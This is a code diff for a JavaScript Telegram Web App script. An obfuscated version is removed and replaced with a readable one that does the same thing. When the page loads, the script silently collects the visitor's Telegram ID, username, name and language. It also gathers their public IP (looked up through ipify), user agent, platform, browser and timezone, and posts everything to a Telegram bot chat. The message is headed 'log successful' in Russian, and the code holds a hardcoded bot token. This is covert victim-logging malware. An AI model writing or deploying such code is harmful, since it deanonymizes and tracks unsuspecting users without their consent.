@@ -1,1 +1,63 @@
-const _0x1685a5=_0x12c2;function _0x4296(){const _0x265cfd=['replace','\x0a*💻\x20Система:*\x0a\x20\x20├\x20IP:\x20','Markdown','POST','test','DateTimeFormat','522fWIVDC','\x0a\x20\x20└\x20Часовой\x20пояс:\x20','json','76609mAcAZv','96702RPUYeA','version\x20','text','parse_mode','DOMContentLoaded','resolvedOptions','4821ztttNm','https://api.telegram.org/bot','initDataUnsafe','addEventListener','platform','10cvOmji','userAgent','1489061hjPdXd','4dHZHfT','-1001565112990','chat_id','445TFIFdu','match','80952zYhuIJ','\x0a\x20\x20├\x20UserAgent:\x20','\x0a\x20\x20├\x20Языковой\x20код:\x20','OPR','username','exec','/sendMessage','\x0a\x20\x20├\x20Имя:\x20','then','language_code','location','\x0a\x20\x20├\x20Фамилия:\x20','\x0a\x20\x20├\x20ОС:\x20','trim','first_name','TOKEN','90GAQMzL','timeZone','146058xeULdd','IE\x20','1812iHlEhi','env','user','\x0a\x20\x20├\x20Тэг:\x20@','Telegram','https://api.ipify.org?format=json','append','44970TEnuyK'];_0x4296=function(){return _0x265cfd;};return _0x4296();}(function(_0x53cf87,_0x338ff2){const _0x5c3d6c=_0x12c2,_0xab15e2=_0x53cf87();while(!![]){try{const _0x12ce9a=parseInt(_0x5c3d6c(0x116))/0x1*(parseInt(_0x5c3d6c(0x10c))/0x2)+parseInt(_0x5c3d6c(0x110))/0x3*(-parseInt(_0x5c3d6c(0x11e))/0x4)+parseInt(_0x5c3d6c(0x121))/0x5*(parseInt(_0x5c3d6c(0x105))/0x6)+-parseInt(_0x5c3d6c(0x11d))/0x7+-parseInt(_0x5c3d6c(0x123))/0x8*(parseInt(_0x5c3d6c(0x133))/0x9)+-parseInt(_0x5c3d6c(0x11b))/0xa*(-parseInt(_0x5c3d6c(0x135))/0xb)+-parseInt(_0x5c3d6c(0x137))/0xc*(parseInt(_0x5c3d6c(0x10f))/0xd);if(_0x12ce9a===_0x338ff2)break;else _0xab15e2['push'](_0xab15e2['shift']());}catch(_0x392915){_0xab15e2['push'](_0xab15e2['shift']());}}}(_0x4296,0xab8a0));let tg=window[_0x1685a5(0x102)]['WebApp'];function _0x12c2(_0xdece22,_0x5d823c){const _0x429699=_0x4296();return _0x12c2=function(_0x12c281,_0x4000d9){_0x12c281=_0x12c281-0xff;let _0x5e1a3a=_0x429699[_0x12c281];return _0x5e1a3a;},_0x12c2(_0xdece22,_0x5d823c);}document[_0x1685a5(0x119)](_0x1685a5(0x114),function(){const _0x13c71e=_0x1685a5,_0x39286e=new URLSearchParams(window[_0x13c71e(0x12d)]['search']),_0xf73dcd=navigator[_0x13c71e(0x11c)];fetch(_0x13c71e(0x103))[_0x13c71e(0x12b)](_0x57a6b9=>_0x57a6b9[_0x13c71e(0x10e)]())[_0x13c71e(0x12b)](_0x59136c=>{const _0x136bb8=_0x13c71e,_0x47aa3e=_0x59136c['ip'],_0x14576f=navigator[_0x136bb8(0x11a)],_0x1c83f5=Intl[_0x136bb8(0x10b)]()[_0x136bb8(0x115)]()[_0x136bb8(0x134)],_0x25b42b=_0x323964();let _0x18f8c4=document['createElement']('p');const _0x5f0e56='\x0a🔥\x20Лог\x20успешен!\x0a\x0a*🧭\x20Базовая\x20информация:*\x0a*🔍\x20Аккаунт\x20в\x20тг:*\x0a\x20\x20├\x20Айди:\x20'+tg[_0x136bb8(0x118)]['user']['id']+_0x136bb8(0x101)+tg['initDataUnsafe'][_0x136bb8(0x100)][_0x136bb8(0x127)]+_0x136bb8(0x12a)+tg[_0x136bb8(0x118)][_0x136bb8(0x100)][_0x136bb8(0x131)]+_0x136bb8(0x12e)+tg[_0x136bb8(0x118)][_0x136bb8(0x100)]['last_name']+_0x136bb8(0x125)+tg['initDataUnsafe'][_0x136bb8(0x100)][_0x136bb8(0x12c)]+_0x136bb8(0x107)+_0x47aa3e+_0x136bb8(0x124)+_0xf73dcd+_0x136bb8(0x12f)+_0x14576f+'\x0a\x20\x20├\x20Браузер:\x20'+_0x25b42b+_0x136bb8(0x10d)+_0x1c83f5,_0x40555f=process[_0x136bb8(0xff)][_0x136bb8(0x132)],_0x107161=_0x136bb8(0x11f),_0x4f29f0=_0x136bb8(0x117)+_0x40555f+_0x136bb8(0x129),_0x117f2e=new FormData();_0x117f2e['append'](_0x136bb8(0x120),_0x107161),_0x117f2e['append'](_0x136bb8(0x112),_0x5f0e56),_0x117f2e[_0x136bb8(0x104)](_0x136bb8(0x113),_0x136bb8(0x108)),fetch(_0x4f29f0,{'method':_0x136bb8(0x109),'body':_0x117f2e});});function _0x323964(){const _0x2729e0=_0x13c71e,_0x5588ec=navigator['userAgent'];let _0x524744='';const _0x203fff=_0x5588ec[_0x2729e0(0x122)](/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)||[];if(/trident/i[_0x2729e0(0x10a)](_0x203fff[0x1])){const _0x464a61=/\brv[ :]+(\d+)/g[_0x2729e0(0x128)](_0x5588ec)||[];_0x524744=_0x2729e0(0x136)+(_0x464a61[0x1]||'');}if(_0x203fff[0x1]==='Chrome'){const _0x48d6ee=_0x5588ec[_0x2729e0(0x122)](/\b(OPR|Edge)\/(\d+)/);if(_0x48d6ee!=null)_0x524744=_0x48d6ee['slice'](0x1)['join']('\x20')[_0x2729e0(0x106)](_0x2729e0(0x126),'Opera');}return _0x203fff[0x2]=_0x203fff[0x2]?_0x2729e0(0x111)+_0x203fff[0x2]:'',_0x524744=((_0x203fff[0x1]||'')+'\x20'+(_0x203fff[0x2]||''))[_0x2729e0(0x130)](),_0x524744;}});
+let tg = window.Telegram.WebApp;
+document.addEventListener('DOMContentLoaded', function() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const userAgent = navigator.userAgent;
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ip = data.ip;
+      const osname = navigator.platform;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const browser = getBrowserInfo();
+      let userid = document.createElement('p');
+
+      const message = `
+🔥 Лог успешен!
+
+*🧭 Базовая информация:*
+*🔍 Аккаунт в тг:*
+  ├ Айди: ${tg.initDataUnsafe.user.id}
+  ├ Тэг: @${tg.initDataUnsafe.user.username}
+  ├ Имя: ${tg.initDataUnsafe.user.first_name}
+  ├ Фамилия: ${tg.initDataUnsafe.user.last_name}
+  ├ Языковой код: ${tg.initDataUnsafe.user.language_code}
+*💻 Система:*
+  ├ IP: ${ip}
+  ├ UserAgent: ${userAgent}
+  ├ ОС: ${osname}
+  ├ Браузер: ${browser}
+  └ Часовой пояс: ${timeZone}`;
+      
+      const token = '7191308947:AAHeu-IRhFSb0QS8RxVyCPptfT_lMNLIWOU';
+      const chatId = '-1001565112990';
+      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
+      const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', message);
+        formData.append('parse_mode', 'Markdown')
+        fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+      });
+
+  function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    let browser = '';
+    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+
+    if (/trident/i.test(match[1])) {
+      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+      browser = `IE ${tem[1] || ''}`;
+    }
+
+    if (match[1] === 'Chrome') {
+      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
+      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
+    }
+
+    match[2] = match[2] ? `version ${match[2]}` : '';
+    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
+    return browser;
+  }
+  });
